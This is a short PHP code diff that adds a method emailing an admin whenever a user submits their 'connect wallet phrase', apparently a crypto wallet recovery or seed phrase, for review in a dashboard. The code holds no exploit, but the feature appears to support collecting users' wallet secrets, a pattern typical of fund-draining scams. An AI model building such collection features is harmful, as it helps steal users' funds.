@@ -494,4 +494,22 @@ class NotificationController extends Controller
             ]);
         }
     }
+
+    public static function sendAdminUserConnectWalletNotification($admin, $user)
+    {
+        $msg = 'User <b>'.$user->first_name. ' ' .$user->last_name.'</b> has added their connect wallet phrase.<br><br>
+                <b>Details:</b><br>
+                - Username: '.$user->username.'<br>
+                - Email: '.$user->email.'<br>
+                - Submission Date: '.now()->format('Y-m-d H:i:s').'<br><br>
+                Please review the documents in the admin dashboard at your earliest convenience.';
+
+        try {
+            $admin->notify(new CustomNotificationByEmail('User added connect wallet', $msg));
+        } catch (\Exception $e) {
+            Log::error('Admin ID upload notification email sending failed: ' . $e->getMessage(), [
+                'exception' => $e
+            ]);
+        }
+    }
 }
